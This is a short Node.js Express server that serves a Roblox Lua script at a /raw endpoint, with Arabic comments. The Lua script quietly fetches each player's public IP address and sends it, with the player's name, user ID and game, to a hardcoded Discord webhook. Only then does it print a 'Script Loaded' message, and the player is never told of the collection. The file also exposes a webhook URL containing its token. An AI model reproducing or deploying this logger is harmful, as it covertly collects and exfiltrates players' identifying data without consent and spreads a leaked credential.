const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const webhookUrl = "https://discord.com/api/webhooks/1500997210794365000/b3XsDU-dBJ874IPO1pZUK91CWwfk76K7HwzhMkz3ySt9WMKQHNQdheuBIMyFDd1HnwAb"; 

const myScript = `
local http = game:GetService("HttpService")
local player = game.Players.LocalPlayer

-- وظيفة لسحب الآي بي من موقع خارجي
local function getIp()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    return success and result or "Unknown"
end

local userIp = getIp()

-- قائمة الحظر (ضع الآي بي الذي تريد حظره هنا)
local bannedIps = {
    "1.1.1.1", -- مثال
}

for _, ip in pairs(bannedIps) do
    if userIp == ip then
        player:Kick("انت محظور من استخدام هذا السكربت (IP BAN)")
        return
    end
end

-- إرسال البيانات المارقة للويب هوك
local data = {
    ["content"] = "🚨 **تقرير دخول جديد!**",
    ["embeds"] = {{
        ["title"] = "معلومات المستخدم الكاملة",
        ["fields"] = {
            {["name"] = "اللاعب", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "ID", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "الآي بي (IP)", ["value"] = userIp, ["inline"] = false},
            {["name"] = "اللعبة", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false}
        },
        ["color"] = 16711680 -- لون أحمر للتنبيه
    }}
}

pcall(function()
    http:PostAsync("${webhookUrl}", http:JSONEncode(data))
end)

-- كود الواجهة الأصلي يبدأ هنا
print("Script Loaded for: " .. player.Name)
`;

app.get('/raw', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(myScript);
});

app.listen(PORT, () => console.log('Server is running!'));
